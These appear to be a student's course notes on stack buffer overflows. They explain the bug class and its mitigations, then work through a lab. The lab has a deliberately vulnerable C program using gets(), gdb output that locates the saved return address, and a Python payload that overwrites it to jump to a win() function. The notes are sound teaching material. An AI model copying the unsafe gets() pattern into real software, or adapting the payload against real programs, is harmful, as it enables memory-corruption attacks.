> [!idea]+ Buffer Overflow Vulnerabilities
>
> A buffer overflow is a security vulnerability that **occurs when a program writes more data to a buffer (array) than it can hold**, causing the excess data to overflow into adjacent memory locations.
> 
> ![[Pasted image 20240319142840.png]]
>
> Why buffer overflows are dangerous:
> - The overflowed data **can corrupt important program information** stored in memory
> - Attackers can intentionally overflow buffers to **overwrite control data like return addresses or function pointers**
> - By carefully crafting their input, **attackers can hijack program execution and run arbitrary code**
>
> **Example:** Consider an ATM program in C that prompts users to enter their name:
>
> ```c
> void getName() {
>     char name[20];
>     printf("Enter your name: ");
>     gets(name);
>     // ...
> }
> ```
>
> The `name` buffer can only hold 20 characters, but `gets()` allows writing an arbitrary length string. An attacker could input a very long name:
>
> ```
> AAAAAAAAAAAAAAAAAAAA\x10\x21\x51\x31...
> ```
>
> The `A`s overflow the buffer, and the `\x10\x21\x51\x31` bytes overwrite the return address. When `getName()` returns, execution jumps to the attacker's code instead of the intended location.
> 
> ![[Pasted image 20240319143354.png]]
>
> **Potential outcomes of buffer overflow attacks**:
> - Crashing the program (benign case)
> - Redirecting execution to an existing function (e.g. `dispenseMoney()`)
> - **Injecting and executing custom shellcode** (e.g. spawning a shell, stealing data) 
>
> **Solutions and mitigations**:
> - Use **runtime bounds checking** to validate array indices and sizes (performance overhead) (Implemented in Python, Rust, Java but not C, C++)
> - Employ secure string handling functions that limit input length
> - Enable compiler protections like stack canaries, ASLR, and DEP
> - Most importantly, write secure code that validates untrusted input 
>
> In summary, buffer overflows allow attackers to corrupt memory and hijack program control flow. Careful programming practices are essential to prevent these dangerous vulnerabilities.


> [!exercise]+ Exercise - Exploiting Stack Overflow to Change Program Flow
>
> **Example Scenario:**
>
> A vulnerable C program has a function `hello()` that uses `gets()` to read user input into a buffer `buf` of size 17 bytes. The program is not supposed to reach the `win()` function, which prints "You win!". The goal is to exploit the stack overflow vulnerability to overwrite the return address and redirect program flow to the `win()` function.
>
> Here's the vulnerable C code:
>
> ```c
> #include <stdio.h>
> #include <stdlib.h>
>
> void win()
> {
>     printf("You win!\n");
> }
>
> void hello()
> {
>     char buf[17];
>     printf("What is your name? ");
>     gets(buf);
>     printf("Hello %s!\n", buf);
> }
>
> int main(int argc, char **argv)
> {
>     hello();
>     return 0;
> }
> ```

> [!exercise]+ Analyzing the Stack Frame
>
> 1. Set a breakpoint just before the `hello()` function ends and run the program with a pattern of 16 "A"s as input.
>
>    ```
>    (gdb) br 12
>    Breakpoint 1 at 0x1217: file flow.c, line 12.
>    (gdb) run < <(python -c 'print("A"*16)')
>    Starting program: /home/a1112407/ws5/flow < <(python3 -c 'print("A"*16)')
>    
>    Breakpoint 1, hello () at flow.c:12
>    12 printf("Hello %s!\n", buf);
>    ```
>
> 2. Use `info frame` to find the location of the saved return address (saved EIP) on the stack. In this case, it's at `0xffffd32c`.
>
>    ```
>    (gdb) info frame
>    Stack level 0, frame at 0xffffd330:
>     eip = 0x565561c1 in hello (flow.c:12); saved eip = 0x565561e6
>     called by frame at 0xffffd350
>     source language c.
>     Arglist at 0xffffd328, args: 
>     Locals at 0xffffd328, Previous frame's sp is 0xffffd330
>     Saved registers:
>      ebp at 0xffffd328, eip at 0xffffd32c
>    ```
>
> 3. Use `x/40x $esp` to examine the stack contents. The series of `0x41414141` represents the 16 "A"s in the `buf` buffer.
>
>    ```
>    (gdb) x/40x $esp
>    0xffffd310: 0x41414141 0x41414141 0x41414141 0x41414141
>    0xffffd320: 0x00000000 0x00000000 0x00000000 0xf7fb3000
>    0xffffd330: 0xffffd350 0x565561e6 0x00000000 0xf7dfa811
>    0xffffd340: 0x00000001 0xffffd3d4 0xffffd3dc 0xffffd364
>    ```
>
> 4. Determine the address of the `win()` function using `print win`. In this example, it's at `0x565561b9`.
>
>    ```
>    (gdb) print win
>    $2 = {void ()} 0x565561b9 <win>


> [!exercise]+ Exercise
> Contents




> [!success]+ Crafting the Exploit Payload
>
> 1. To overwrite the return address and redirect execution to `win()`, the payload needs to:
>    - Fill the `buf` buffer with 16 bytes of data ("A"s).
>    - Pad an additional 12 bytes to reach the saved return address.
>    - Overwrite the saved return address with the address of `win()` (`0x565561b9`).
>
> 2. The Python payload to generate this exploit string is:
>    ```python
>    print("A"*28 + "\xb9\x61\x55\x56")
>    ```
>    - `"A"*28` fills the buffer and padding (16 + 12 bytes).
>    - `"\xb9\x61\x55\x56"` is the little-endian representation of `0x565561b9` (address of `win()`).
>
> **Why It Works:**
>
> - The `buf` buffer can hold 17 bytes, but `gets()` allows writing beyond the buffer size, overflowing the stack.
> - By carefully crafting the input, we can overwrite the saved return address on the stack with the address of the `win()` function.
> - When the `hello()` function returns, instead of returning to the original caller, it jumps to the `win()` function, printing "You win!".
>
> This example demonstrates how stack overflow vulnerabilities can be exploited to manipulate program flow by overwriting the saved return address on the stack, allowing arbitrary code execution.